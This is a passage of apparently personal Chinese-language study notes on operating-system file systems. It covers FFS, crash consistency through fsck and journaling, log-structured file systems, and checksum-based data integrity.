<li>读取后，更新文件描述符对象中的当前数据块编号，以便下次读取时，可以从上次读取结束后的位置继续；</li>
</ul>
<h4 id="写入旧文件"><a href="#写入旧文件" class="headerlink" title="写入旧文件"></a>写入旧文件</h4><p>将数据写入到磁盘还是涉及挺多动作的，除了跟读取一样，将路径先转换成 inode 外，接下来还涉及：</p>
<ul>
<li>读取数据位图，为新数据分配某个空闲块；</li>
<li>更新数据位图，标记该空闲块的状态为“已占用”；</li>
<li>读取 inode；</li>
<li>添加新的 inode 数据块指针，让其指向刚分配的空闲数据块地址；</li>
<li>将数据写入数据块；</li>
</ul>
<h4 id="创建新文件"><a href="#创建新文件" class="headerlink" title="创建新文件"></a>创建新文件</h4><p>以上仅仅是写入数据到一个已存在的文件，如果是创建一个新文件，则涉及的动作还更多一些，包括：</p>
<ul>
<li>读取 inode 位图，寻找空闲 inode；</li>
<li>将某个空闲 inode 位标记为已使用；</li>
<li>为新文件创建一个 inode 对象，将 inode 对象写入到 inode 表；</li>
<li>读取文件所在目录的 inode，找到其指向的数据块；</li>
<li>向目录的数据块中增加一条记录，映射新建的文件名和它的 inode 编号；</li>
<li>如果目录的数据块已满，则需要分配新的目录数据块，因此还需要读取数据块位图，寻找空闲块，并更新目录的 inode 对象，添加指向新数据块的指针；</li>
</ul>
<h3 id="缓存和缓冲"><a href="#缓存和缓冲" class="headerlink" title="缓存和缓冲"></a>缓存和缓冲</h3><p>由于在读写文件时，有很高的磁盘 I&#x2F;O 成本，因此，为了提高性能，引入了缓存机制，即在内存中，划分一片区域作为缓存；在首次读取时，将数据放入到缓存中；由于局部性现象的存在，后续的读取，大概率会命中缓存，而无须发生额外的磁盘 I&#x2F;O；</p>
<p>另外还引入了延迟写入的策略，每隔一段固定的时间，将缓存中的新数据，写入到磁盘上，这种策略有以下几个好处：</p>
<ul>
<li>如果某个块被多次写入，则最后只发生一次 I&#x2F;O；</li>
<li>如果某个块最后被删除了，则完全没有发生 I&#x2F;O；</li>
<li>待写入的数据暂时放在缓存中，意味着后续对该块的读写，可以直接读取缓存，无须通过 I&#x2F;O 再次访问存储设备；</li>
</ul>
<p>一般来说，延迟写入的时间间隔为 5-30 秒，但是它有一个缺点，即在写入之前，如果系统崩溃和停机了，待写入的数据将会丢失；有些应用程序对此无法容忍，例如数据库程序，因此它会直接调用 fsync 实现立即写入，避免延迟；</p>
<h2 id="32-局部性和快速文件系统-FFS"><a href="#32-局部性和快速文件系统-FFS" class="headerlink" title="32.局部性和快速文件系统 FFS"></a>32.局部性和快速文件系统 FFS</h2><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201120082014.png"></p>
<p>早期的 UNIX 系统使用以上结构的文件系统设计，它本质上是将整个磁盘当作一个随机存取的内存来对待（但磁盘跟内存有所不同，内存的随机存取是很快的，但磁盘有寻道成本）；这个设计的好处在于它实现起来非常简单；缺点是随着使用时间的推移，最终将会导致文件的存储变得非常碎片化，从而带来很多的磁盘寻道定位成本（这也是当年为什么会有磁盘碎片整理工具这种东西出现的原因）；</p>
<blockquote>
<p>问：如何设计和组织文件系统使用的数据结构，以提高访问性能？以及如何设计分配策略？</p>
</blockquote>
<h3 id="FFS：磁盘意识"><a href="#FFS：磁盘意识" class="headerlink" title="FFS：磁盘意识"></a>FFS：磁盘意识</h3><p>解决办法也很简单，老式 UNIX 文件系统设计的问题在于将整个磁盘当作随机存取的内存使用，因此，有必要反其道而行之；由于暴露给用户的抽象是文件和目录；目录是让用户组织其文件的一种方式；这意味着用户天然会将相同组别的文件放在同一个目录中，而且由于局部性原理，用户在访问下一个文件的时候，跟上一个文件在相同目录的概率比较大；</p>
<p>接下来 FFS 要做两件事情：</p>
<ul>
<li>将磁盘按柱面分成多个柱面组（很有点类似目录的味道；按柱面的原因在于相同柱面的寻道时间比较短）；</li>
<li>每个柱面组内部像是一个小磁盘，由一个超级块副本+两个位图+数据块组成（跟上章的简单文件系统一模一样）；</li>
<li>将相同目录下的文件，尽量放在同一个组中，避免跨组；（为了让各个目录尽量分散在所有组中，FFS 在放置新目录时，会特意寻找分配数量少的柱面组）</li>
</ul>
<h3 id="大文件例外"><a href="#大文件例外" class="headerlink" title="大文件例外"></a>大文件例外</h3><p>分组的另一点核心思想在于让各目录尽量平均分配到不同的组中，避免出现目录的存储出现跨组，不然就失去了局部性所能够带来的好处；但对于特别大的文件来说，它有可能会填满整个组并跨到下一个组，这样就破坏了局部性；</p>
<p>解决这个问题的方法之一是将大文件平均分配到各个组中，而不是在单个组中存储；当然，这样不可避免会带来多次的寻道成本，但这里面会有一个折中，即为了实现预期的传输带宽，应该将单组中的块设置为多大；</p>
<p>目前 FFS 的策略简单而粗暴，它将 inode 的 12 个直接指针指向的数据块和 inode 放在同一组，余下的每一个间接块，跟其指向的数据块，单独放在一个组；不同的间接块，放在不同的组（如果块的大小为 4KB 的话，磁盘地址为 32 位 4 个字节的话，则有 1024 个指针，其指向的数据块的总存储容量为 4MB）；</p>
<h3 id="关于-FFS-的其他几件事"><a href="#关于-FFS-的其他几件事" class="headerlink" title="关于 FFS 的其他几件事"></a>关于 FFS 的其他几件事</h3><h4 id="子块"><a href="#子块" class="headerlink" title="子块"></a>子块</h4><p>当块的大小设置为 4KB 时，有利于提高缓存的命中率，从而提高磁盘的读取性能；但是如果磁盘上大量的文件都只有 2KB 的话，将意味着每个 4KB 的块中，都只有一半的空间得到利用，最终结果将导致磁盘的容量利用率只有预期的一半；解决思路是额外引入另外一种小规格的块（称为子块，sub-block），例如大小为 512B 的块，当某个文件少于 2KB 时，文件系统就为其分配子块；如果后续随着时间推移，文件变大了，则继续为其分配更多的子块，直到其大小达到 4KB 后，再为其分配规格为 4KB 的正常块，并将子块的数据复制过去；当然，这种方法带来了复制的成本，不过由于存在延迟写入的机制，这种复制通常只会发生在内存上，而不是在磁盘上；</p>
<h4 id="磁盘缓存"><a href="#磁盘缓存" class="headerlink" title="磁盘缓存"></a>磁盘缓存</h4><p>当块在磁盘上是按编号顺序连续性存储的时候，将会带来一个问题，即当文件系统发出块 0 的请求后，再次发送块 1 的请求时，磁盘已经放置到块 1 的位置了，而磁盘解析请求本身是需要时间的，因此将错过块 1，需要再完整的放置一周后，才能重新定位到块 1；为了解决这个问题，早期的思路是让块在磁盘上进行跳跃布局，这样可以为解析磁盘请求争取到时间；不过跳跃性布局也会带来一个问题，即最多只能得到磁盘一半的带宽，因为块是间隔存储的；后来现代磁盘引入了磁道缓冲区技术，即在其内部增加了单独的缓存，每次将整个磁道的数据读取到缓存中，这样就不需要担心旋转的问题了；</p>
<h2 id="33-崩溃一致性：FSCK-和日志"><a href="#33-崩溃一致性：FSCK-和日志" class="headerlink" title="33.崩溃一致性：FSCK 和日志"></a>33.崩溃一致性：FSCK 和日志</h2><blockquote>
<p>问：对于某条数据写入请求，磁盘上数据更新操作是有多个步骤的，而不是原子性的，例如需要分别更新位图、inode 记录、数据块等步骤；当在更新过程中，突然机器出现断电或系统崩溃时，文件系统如何让磁盘上的数据保持一致性的状态，而不是部分写入，部分未写入，导致冲突错误？</p>
</blockquote>
<h3 id="方案一：FSCK"><a href="#方案一：FSCK" class="headerlink" title="方案一：FSCK"></a>方案一：FSCK</h3><p>FSCK，file system check，文件系统检查；思路很简单，当由于断电或操作系统崩溃等错误发生时，文件系统先啥也不做；然后等再次被操作系统挂载并可用之前，做一次检查，修复之前的错误；</p>
<blockquote>
<p>FSCK 相当于做了整个磁盘的扫描工作，包括检查超级块、空闲块、inode 状态、inode 链接、重复指针、坏块指针、目录引用等；虽然这种检查方法是有效的，但是性能代价太高昂了，尤其是对于越来越大的磁盘，每次检查将花去几分钟甚至是几小时的时间；实现的目标仅仅某次写入涉及可能存在错误的3个块而已，很不值得；</p>
</blockquote>
<h3 id="方案二：日志"><a href="#方案二：日志" class="headerlink" title="方案二：日志"></a>方案二：日志</h3><p>思路是在将数据写入磁盘之前，将本次要实现的操作，提前单独写在某个指定的地方，形成日志；这样在遇到崩溃的场景时，就可以从日志中提取原来要实现的操作，并检查这些操作是否按预期完成了，如果没有，就重复执行一遍相关的操作，确保它们完成；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201125091351.png"></p>
<h4 id="数据日志"><a href="#数据日志" class="headerlink" title="数据日志"></a>数据日志</h4><p>当发生文件的写入时，一般会涉及三个块需要更新，包括 inode、位图、数据块；物理日志的方式，是将这三个块的内容完整的写到日志中，并在其前后各包含一个标识开始 TxB 和结束 TxE 的事务块</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201125091312.png"></p>
<blockquote>
<p>TxB：Transaction Begin；TxE：Transaction End；</p>
</blockquote>
<p>为了应对在日志写入过程中，出现断电或崩溃的场景，需要将日志的写入分成两部分，先写入头部和三个块，完成后，再写入事务的结束块，并将结束块的大小设置为 512 B，因为这个大小的块，磁盘的写入是原子性的；整个过程的顺序如下：</p>
<ul>
<li>日志写入：事务头部块和三个块</li>
<li>日志提交：事务的结束块；</li>
<li>加检查点：将三个块写入磁盘；</li>
</ul>
<h4 id="恢复"><a href="#恢复" class="headerlink" title="恢复"></a>恢复</h4><p>系统崩溃会在两个时间点下发生：</p>
<ul>
<li>日志提交前：忽略该段日志，数据丢失；</li>
<li>日志提交后：重放该段日志，按日志对磁盘再做一次操作，数据未丢失；</li>
</ul>
<h4 id="批处理日志更新"><a href="#批处理日志更新" class="headerlink" title="批处理日志更新"></a>批处理日志更新</h4><p>写日志的动作其实增加了额外的磁盘 I&#x2F;O，因为除了更新文件和目录的块外，现在又要多一次更新日志块的动作了；为了避免因此带来的性能问题，通常的做法是先将日志数据缓存在内存中，形成一条全局事务，然后每隔一段时间，做一次批处理的更新，而不是每条日志事务单独更新一次磁盘；</p>
<blockquote>
<p>如何在批量更新日志时，发生了崩溃，那么日志的内容将会丢失，如果此时有数据正在写入，貌似也会丢失？</p>
</blockquote>
<h4 id="循环日志"><a href="#循环日志" class="headerlink" title="循环日志"></a>循环日志</h4><p>日志的内容会不断累积，最终超过磁盘容量， 为了避免这个问题，可以通过增加一个日志超级块，加完检查点后，每隔一段时间，将已完成检查点的日志标记为空闲可重用的状态；</p>
<h4 id="元数据日志"><a href="#元数据日志" class="headerlink" title="元数据日志"></a>元数据日志</h4><p>物理日志存在两个方法的问题：</p>
<ul>
<li>由于每个数据块需要写入磁盘两次（一次写在日志中，一次写在目标位置中），使得带宽只剩下原来的一半；</li>
<li>日志和目标位于不同的磁道，因为带来了额外的寻道时间成本；</li>
</ul>
<p>解决办法：不将数据块写日志，只将元数据部分的内容写到日志中；（此种机制下，貌似需要先将数据写入数据块，之后再来写日志）</p>
<blockquote>
<p>莫非这就是传说中的逻辑日志？</p>
</blockquote>
<h4 id="棘手的情况：块复用"><a href="#棘手的情况：块复用" class="headerlink" title="棘手的情况：块复用"></a>棘手的情况：块复用</h4><blockquote>
<p>删除文件和目录时，将带来一场噩梦！想一想，它会发生什么？</p>
</blockquote>
<p>当采用元数据日志的模式时，数据块并没有写入日志，只将元数据写在了日志中；这意味着，与目录有关的更新由于都属于元数据，因此都会写在日志中；当用户在某个目录中添加某个文件时，由于目录的元数据会产生更新，因此，日志中有一条关于该目录更新的日志；</p>
<p>假设之后用户删除了整个目录，并重新创建一个新文件，当采用元数据日志时，日志和该新文件的数据会首先写入磁盘，假设此时写入的位置复用了此前删除的目录的块，然后在日志提交后，系统发生了崩溃；根据原本的协议，系统在恢复后，用户预期应该能够得到崩溃前写入的数据；</p>
<p>但是，此时事情并不能如预期一样发生；因为日志中还有一条关于目录的更新会被重放，而且它发生在创建新文件的日志之前，这意味着在重放时，原本数据块上的新文件数据，将会被覆盖；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201126084534.png"></p>
<p>有两种办法可以避免该问题：</p>
<ul>
<li>在某条日志被标记为空闲前（即日志对应的操作已顺利完成，日志块将被复用），避免涉及的块的重用；</li>
<li>日志引入一种新类型的撤销记录，删除目录使用该记录；当重放时，此种类型的记录不重放；</li>
</ul>
<blockquote>
<p>问题1：当删除一个文件时，会发生什么？当在操作过程中发生崩溃后，会发生什么？</p>
<ul>
<li>更新文件所在目录的数据块，删除文件的映射记录；</li>
<li>更新 inode 位图和数据块位图，标记为空闲；</li>
</ul>
<p>以上几个动作需要打包成一个事务，写到日志中，以便确保操作是原子性的，避免文件系统出现不一致；</p>
</blockquote>
<blockquote>
<p>问题2：当删除一个目录时，会发生什么？当操作过程中发生崩溃后，会发生什么？</p>
<ul>
<li>扫描目录中所有映射条目，获取每个条目指向的 inode；</li>
<li>获取每个文件 inode 指向的数据块指针；</li>
<li>将所有文件对应的 inode 位图和数据块位图，标记为空闲；</li>
<li>将目录对应的 inode 位图和数据块位图，标记为空闲；</li>
<li>更新目录所在的父级目录的 inode 属性和元数据块，删除映射；</li>
</ul>
</blockquote>
<p>由于没有 TxE 块的事务是无效的，因此 TxB 块和元数据块写入日志的请求，和数据块的写入请求可以并行发出，重点是 TxE 块的写入请求需要等待前面三个请求完成后才可以发出； </p>
<h3 id="其他方案"><a href="#其他方案" class="headerlink" title="其他方案"></a>其他方案</h3><p>除了 FSCK 和日志外，其他保持文件系统数据一致性的方案：</p>
<h4 id="强制排序"><a href="#强制排序" class="headerlink" title="强制排序"></a>强制排序</h4><p>对写入进行强制排序，这样可以避免磁盘出现不一致状态，例如先写数据块，再写 inode；</p>
<h4 id="写时复制-1"><a href="#写时复制-1" class="headerlink" title="写时复制"></a>写时复制</h4><p>copy-on-write；当发生写入时，不覆盖原文件或目录，而是写到空闲块，写完后更新目录结构，让指针指向新的位置；（如果写失败了，数据会丢失，但旧文件仍然保持一致性；貌似更新目录的操作需要是原子性的，避免更新一半的时候失败了）；</p>
<h4 id="反向指针"><a href="#反向指针" class="headerlink" title="反向指针"></a>反向指针</h4><p>在数据块中添加一个指向 inode 的指针；当发生崩溃时，比对 inode 中的数据块指针，和数据块中的 inode 指针是否匹配（问：如何快速知道哪些写入的指针不匹配？）；</p>
<h4 id="事务校验和"><a href="#事务校验和" class="headerlink" title="事务校验和"></a>事务校验和</h4><p>不强制事务写入的顺序，而是通过事后计算校验和，来确定是否写入有效，执行成功；（此方法性能不错，但需要磁盘提供新接口；</p>
<blockquote>
<p>问：如果在校验之前，系统发生崩溃会怎么样？</p>
<p>答：写入被当作无效，这样文件系统中不会发生一致性问题，但数据将会丢失好像？</p>
</blockquote>
<h2 id="34-日志结构文件系统"><a href="#34-日志结构文件系统" class="headerlink" title="34.日志结构文件系统"></a>34.日志结构文件系统</h2><blockquote>
<p>在读了原始论文后，我终于知道它为什么叫日志结构文件系统了，因为传统的文件是将日志做为一种辅助，临时存储目标数据，以便存储过程中发生崩溃时，可以从日志中恢复目标数据；但 LFS 则直接将目标数据存储在日志中，不再单独额外的存储一份目标数据，所以叫日志结构的文件系统，非常形象；</p>
<p>这样做有一个很大的好处是崩溃恢复非常快，无须做全盘检查，只需检查最后更新的那份日志即可；同时目标数据无形中得到了历史快照，可以任意恢复到某个历史版本（如果还没有被覆盖的话）；</p>
</blockquote>
<h3 id="寻道成本"><a href="#寻道成本" class="headerlink" title="寻道成本"></a>寻道成本</h3><p>FFS 快速文件系统在日常场景中的性能并不是特别好，因此每做一次文件更新，需要做很多次磁盘 I&#x2F;O，虽然通过引入缓存，可以缓解这个问题，但这只是将多个 I&#x2F;O 一次性发给磁盘进行顺序优化，实质上仍然不可避免磁盘内部的寻道成本和旋转成本，因为每个磁盘 I&#x2F;O 并不是顺序写入；虽然这些写入由于分组的技术，通常在一个柱面组中，但仍然会带来短寻道和旋转延迟的成本；</p>
<p>考虑内存容量和磁盘传输速度在逐年增加，而寻道和旋转成本却进步缓慢，因此如果能够将文件系统改进为顺序写入，随着时间的推移，将获得越来越大的性能优势；</p>
<blockquote>
<p>日志结构文件系统，log-structure file system 名称的由来在于它将整个磁盘当做一个循环日志来对待，就像写日志一样，每次新的写入，都写入到尾部，不覆盖旧数据；等日志写满了后，又重头开始写；</p>
</blockquote>
<h3 id="顺序写入"><a href="#顺序写入" class="headerlink" title="顺序写入"></a>顺序写入</h3><p>解决这个问题的办法有两点：</p>
<ul>
<li>根据磁盘传输速度，设置足够大的缓存，一次性积累足够多的待写入数据；</li>
<li>将数据发给磁盘做顺序写入，以获得磁盘最大的带宽速度（一般为峰值速度的 90%）；</li>
</ul>
<p>以上方案的挑战：</p>
<ul>
<li>顺序写入意味着不现更新和覆盖旧的数据块，而是永远将数据写到新的数据块中；这意味着 inode 的位置将随着每次写入不断的变换位置，需要解决如何定位最新版本的 inode 的问题；（当使用顺序写入的时候，inode 的内容更新同 FFS 并没有什么不同，区别在于将 inode 更新后的内容写入磁盘的时候；LFS 是写入到新的位置，FFS 覆写原来的位置；因此，对于文件原本已有的数据块，仍由 inode 中的原有的指针指向着，没有变化）；</li>
</ul>
<h3 id="如何定位"><a href="#如何定位" class="headerlink" title="如何定位"></a>如何定位</h3><p>由于 inode 的位置不断变化，因此需要有一个地方，保存指向最新版本的 inode 地址；LFS 使用 inode map（映射）来解决这个问题，类似于用 inode 编号和 inode 地址组成的键值对；给定一个 inode 号，根据映射将得到它的磁盘地址；</p>
<blockquote>
<p>如果将 inode map 映射存储在某个固定的位置，则该位置在文件发生写入时，将不断避免的出现频繁更新，这样会增加寻道成本；因此将 inode map 也作为顺序写入数据的一部分，放置在 inode 右边；注意：imap 中保存着多个文件的映射信息，而不只是一个文件；</p>
<p>另外随着文件的增多，貌似 imap 的体积也会变得越来越大？怎么对应这个问题？另外是否需要标记已经删除的文件，回收 inode 编号？</p>
</blockquote>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201201091620.png"></p>
<p>虽然 imap 和 inode 一起放置，解决了频繁更新 imap 造成的顺序写入破坏，但是它同样导致 imap 本身也不是不断变化位置的。归根结底，仍然需要有一个持久的数据结构，保存着最新版本的 imap 位置；</p>
<h3 id="检查点区域"><a href="#检查点区域" class="headerlink" title="检查点区域"></a>检查点区域</h3><p>解决定位 imap 的方案是引入一个检查点区域（CR，Checkpoint Region），它固定在磁盘的头部，其中保存着每个文件的 imap 地址；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201201091857.png"></p>
<p>由于随着文件写入时，检查点区域同样会出现频繁更新，因此为了避免由于带来的性能问题，它一般设置为每 30 秒更新一次，两次更新期间的数据先保存在内存中；这样就可以将多次 I&#x2F;O 变成一次 I&#x2F;O 了；</p>
<blockquote>
<p>问：检查点区域是否存储着多个 imap？还是只有一个？好奇 CR 里面的内容长什么样子</p>
<p>答：CR 里面的内容包括 imap 所有块的地址、段使用表、时间戳、最后一个写入的段的指针；</p>
</blockquote>
<h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><p>当发生文件读取时，文件系统从检查点区域找到 imap 地址，然后根据地址，将整个 imap 加载到内存中；接下来，根据需要读取的文件的 inode 编号，从 imap 数据中查找到该文件的 inode 地址；根据 inode 地址，加载到文件的元数据，并根据其中的数据块地址，读取到文件中的数据；</p>
<h3 id="处理目录"><a href="#处理目录" class="headerlink" title="处理目录"></a>处理目录</h3><p>当在磁盘上面创建一个文件时，不仅有文件数据需要写入磁盘，同时也需要更新目录数据；因此在顺序写入数据的时候，其实也在顺序写入待更新的目录数据，而由于目录的数据都是元数据，因此每次创建或更新文件，都一直在顺序写入目录中的所有内容（相当于目录的位置一直在发生变动）；</p>
<blockquote>
<p> 问题来了：根目录如何知道旗下各个子目录所在的映射区的位置？莫非映射区中保存着所有的文件和目录的 inode 映射？如果是这样的话，整个映射区就是一个完整的 inode 表；</p>
<p> 如果映射块一直存放在内存中的话，那么读取起来的性能还是很快的；</p>
</blockquote>
<p>映射区的设计，很好的规避了递归更新问题；每当创建一个文件时，文件所在的目录的 inode 也需要被更新，此时目录的新 inode 会和文件、新映射一起顺序写入磁盘的新位置；新映射中包含着目录 inode 的新位置，但该目录的 inode 编号并没有变，因此并不需要更新其父目录的 inode ；</p>
<blockquote>
<p> 从 imap -&gt; inode -&gt; 数据块的查找过程如下：</p>
</blockquote>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201203090806.png"></p>
<h3 id="垃圾收集"><a href="#垃圾收集" class="headerlink" title="垃圾收集"></a>垃圾收集</h3><p>问题：由于每次更新文件和目录，都是写入新的位置，这不可避免会导致部分旧的数据块失效，变成垃圾块；如果放任不管的话，虽然这些垃圾块并没有指针指向它们，但是它们会在磁盘的空间中形成很多小洞，使用大段连续的空闲空间变得越来越少，从而在未来需要顺序写入的时候，找不到大段的连续空间；同时文件系统也需要额外的机制，来标记这些空闲小洞，负担很大；</p>
<p>解决步骤1：不将磁盘作为一个连续存储空间来处理，而是将其分成很多个段，以段为单位来写入数据；每次需要写入新数据时，即使原来的段没有满，也写到新的段中；这样一来就可以减轻空闲标记的工作（感觉跟内存的分页机制有点像）；</p>
<blockquote>
<p>LFS 在清理过程中，如果发现段中的部分数据块仍然是有效的，则会将多个段的有效数据合并复制到一个新的段中，然后将多个旧段回收；</p>
</blockquote>
<blockquote>
<p>突然发现内存有分段分页机制，磁盘也可以有；内存的分段对应不同数据，磁盘的分段对应不同目录均匀分页、相同目录尽量集中的原则；</p>
</blockquote>
<p>解决步骤2：LFS 通过在数据块中增加一个头部，来解决空闲块标记的问题；这个头部包含两个信息，该数据块所属文件的 inode 编号，以及其在文件中的数据块索引号；基于这两样信息，文件系统可以到 imap 中找到当前 inode 块地址，并读取 inode 数据，核对相应索引号的数据块地址，看二者是否匹配；如果匹配，表示该块是活的，仍被 inode 指向；如果不匹配，则表示该块已经失效了，不再被 inode 指向，可以清理了；</p>
<blockquote>
<p>LFS 还偷偷的在数据块头部中写入了文件的版本号信息；当文件发生重大变更时，例如被删除时，LFS 会在文件的 inode 中更新其版本号字段；这样后续在核对是否匹配时，如果版本号不同，则可以直接判断数据块失效，无须再核对数据块地址了，节省了一些时间；</p>
</blockquote>
<h3 id="清理策略"><a href="#清理策略" class="headerlink" title="清理策略"></a>清理策略</h3><p>常见的思路有三种：定期、空闲时、磁盘已满；</p>
<h3 id="崩溃恢复和日志"><a href="#崩溃恢复和日志" class="headerlink" title="崩溃恢复和日志"></a>崩溃恢复和日志</h3><p>对于 LFS，最重要的一点是保证 CR 检查点区域的更新是原子性的，只要这点保证了，貌似就不会产生一致性的问题；为了实现 CR 更新的原子性，LFS 的做法是建立两个 CR，分别位于磁盘的头部和尾部，交替更新它们，这样某次更新过程中出现崩溃，仍然有一份旧版本的 CR 可以使用；</p>
<p>在更新 CR 的时候，文件系统会先生成一个时间戳，写入 CR 起始位置，再写 CR 主体，最后再写入 CR 尾部；这样如果更新过程中发生了崩溃，文件系统通过比对头尾的时间戳，如果二者不一致，则表示当前的 CR 是无效的；</p>
<blockquote>
<p>问：LFS 需要日志吗？如果需要的话，日志保存在哪里？</p>
<p>答：貌似保存在 CR 中？假设文件系统每 30 秒将数据集中写入磁盘一次，则在写入完成前，如果发生崩溃，如果没有日志，这 30 秒的最新数据将会丢失；如果这个丢失是可以接受的话，则貌似不需要日志也是可以的；</p>
</blockquote>
<h3 id="预设前提"><a href="#预设前提" class="headerlink" title="预设前提"></a>预设前提</h3><p>LFS 的整个设计是建立在磁盘的寻道成本过高的前提下的，这对于磁盘存储设备来说是成立的，但是对于闪存存储类型的设备来说，情况则有所变化，寻道成本开始变得可以忽略不计了；不过 LFS 的设计倒是提供了一个额外的好处，即文件系统意外获得了快照，出现意外情况下非常方便恢复旧版本文件；</p>
<h2 id="35-数据完整性和保护"><a href="#35-数据完整性和保护" class="headerlink" title="35.数据完整性和保护"></a>35.数据完整性和保护</h2><blockquote>
<p>问题：当数据写入磁盘后，如果确保当数据从磁盘读取出来时，跟之前写入的数据是一样的？</p>
</blockquote>
<h3 id="磁盘故障模式"><a href="#磁盘故障模式" class="headerlink" title="磁盘故障模式"></a>磁盘故障模式</h3><ul>
<li>整个磁盘不工作了，stop and fail；</li>
<li>某个扇区不工作了，latent sector error；</li>
<li>某个块不工作了，block corruption；</li>
</ul>
<p>整体来说，出现扇区故障和块故障的几率还是不小的：</p>
<table>
<thead>
<tr>
<th>项目</th>
<th>廉价</th>
<th>昂贵</th>
</tr>
</thead>
<tbody><tr>
<td>扇区故障</td>
<td>9.4%</td>
<td>1.4%</td>
</tr>
<tr>
<td>块故障</td>
<td>0.5%</td>
<td>0.05%</td>
</tr>
</tbody></table>
<h3 id="处理潜在的扇区错误"><a href="#处理潜在的扇区错误" class="headerlink" title="处理潜在的扇区错误"></a>处理潜在的扇区错误</h3><blockquote>
<p>问题：文件系统应如何处理潜在扇区错误？需要增加什么额外的机制，来处理该类型的错误？</p>
</blockquote>
<p>当出现扇区错误时，还是很容易在第一时间发现问题的；因为文件系统尝试读取某个块，但由于该块所在的扇区不工作了，因此不能正常的返回需要的数据，此时文件系统就会发现扇区出现了错误；</p>
<p>接下来只需要使用已有的冗余机制，例如 RAID-1 的镜像备份，或者 RAID-4&#x2F;5 的校验和，来重建损坏的扇区即可；</p>
<blockquote>
<p>对于 RAID-4&#x2F;5 来说，如果在多个磁盘上出现相同的扇区损坏，则无法重建成功了；</p>
</blockquote>
<h3 id="检测块错误：校验和"><a href="#检测块错误：校验和" class="headerlink" title="检测块错误：校验和"></a>检测块错误：校验和</h3><p>块错误跟扇区错误不同，它是一种无声的故障，因为当故障发生时，磁盘并不会报错，而只是悄悄的返回了非预期的数据；</p>
<blockquote>
<p>问题：需要什么技术来检测无声的错误？如何有效的实现？</p>
</blockquote>
<h4 id="常见的校验和函数"><a href="#常见的校验和函数" class="headerlink" title="常见的校验和函数"></a>常见的校验和函数</h4><h5 id="异或-XOR"><a href="#异或-XOR" class="headerlink" title="异或 XOR"></a>异或 XOR</h5><p>实现：假设最终的校验和是 4 字节的，则将整个块分成多个以 4 字节为单位的段，给每段相同位置的字节做异或计算；</p>
<p>优点：实现起来非常简单；</p>
<p>缺点：如果同个位置有两个字节处理错误，则异或计算的结果会显示正常，导致错误无法被发现；</p>
<h5 id="加法"><a href="#加法" class="headerlink" title="加法"></a>加法</h5><p>实现：对整个数据块执行二进制补码的加法，忽略溢出；因此只要有任何一个位或多个位的数据出现变化，整个加法的结果都将不同；</p>
<p>优点：实现简单；</p>
<p>缺点：如果数据出现移位，而不是翻转，则无法检查出错误；</p>
<h5 id="Fletcher-校验和"><a href="#Fletcher-校验和" class="headerlink" title="Fletcher 校验和"></a>Fletcher 校验和</h5><p>实现：假设数据块 D 由 d1 至 dn 共 n 个字节组成；有两个校验字节 s1 和 s2，其中</p>
<ul>
<li>s1 &#x3D; s1 + di mod 255</li>
<li>s2 &#x3D; s2 + di mod 255</li>
</ul>
<p>优点：可以检测所有单比特和双比特的错误，以及大部分的突发错误；</p>
<p>缺点：计算稍复杂</p>
<h5 id="循环冗余检验-CRC"><a href="#循环冗余检验-CRC" class="headerlink" title="循环冗余检验 CRC"></a>循环冗余检验 CRC</h5><blockquote>
<p>CRC 全称：cycle redundancy check；</p>
</blockquote>
<p>实现：将数据块 D 视为一个大的二进制数，并将其除以约定的值 k，得到的余数即是 CRC 值；</p>
<h4 id="检验和布局"><a href="#检验和布局" class="headerlink" title="检验和布局"></a>检验和布局</h4><p>最终计算出来的检验和，需要在磁盘上安排一个位置来存储它，有两种方法：</p>
<h5 id="磁盘厂商实现"><a href="#磁盘厂商实现" class="headerlink" title="磁盘厂商实现"></a>磁盘厂商实现</h5><p>将原本 512 字节的块，实际设置为 520 字节，这样多出来的 8 个字节刚好用来存储校验和；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201204084851.png"></p>
<h5 id="文件系统实现"><a href="#文件系统实现" class="headerlink" title="文件系统实现"></a>文件系统实现</h5><p>单独划分一个 512 字节的块用来存储校验和，每个校验和为 8 字节，因此 512 字节的块可以存储 64 个检验和，刚好对应其后的 64 个连续的数据块；不过这种方法有很大的缺点：即当某个数据块的数据发生改变时，需要同时更新校验和所在的块，增加了寻道、定位等 I&#x2F;O 成本；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201204084916.png"></p>
<h3 id="使用校验和"><a href="#使用校验和" class="headerlink" title="使用校验和"></a>使用校验和</h3><p> 使用方法很简单，在读取某个数据块时，同时读取在磁盘上存储的检验和，并与根据数据块计算出来的校验和进行比较，</p>
<ul>
<li>如果二者一致，就返回数据给用户；</li>
<li>如果不一致，如果有冗余机制，尝试进行恢复；如果没有，则报告错误；</li>
</ul>
<h3 id="错误的写入位置"><a href="#错误的写入位置" class="headerlink" title="错误的写入位置"></a>错误的写入位置</h3><blockquote>
<p>问题：磁盘在写入数据时，有可能将数据写入到一个错误的地址上</p>
</blockquote>
<p>为了应对该类故障，可以在校验和添加物理标识符，例如磁盘序号和块号；</p>
<h3 id="丢失的写入"><a href="#丢失的写入" class="headerlink" title="丢失的写入"></a>丢失的写入</h3><blockquote>
<p> 问题：磁盘报告它成功的将数据写入了，但实际上并没有；</p>
</blockquote>
<p>这是一个很蛋疼的问题，当发生此类故障时，前面提到的所有校验机制都将无效，因为块上的旧数据符合上面的任意一条校验规则；一种解决办法是引入写入验证，例如写入后马上读取，但是 I&#x2F;O 成本很高；</p>
<p>其他方法是在磁盘上的某个位置添加额外的校验和，例如在 inode 和间接块中，存储数据块的检验和，这样如果某个数据块没有成功写入，那么数据块里面的数据是旧的，其校验和跟 inode 中存储的校验和将不一致；</p>
<blockquote>
<p>有一种极端情况是连 inode 中的校验和的写入也丢失了，这样就没有办法检验了；不过貌似数据块和 inode 的写入同时丢失是一个小概率事件，当然，任何小概率事件早晚都是有可能发生的；</p>
</blockquote>
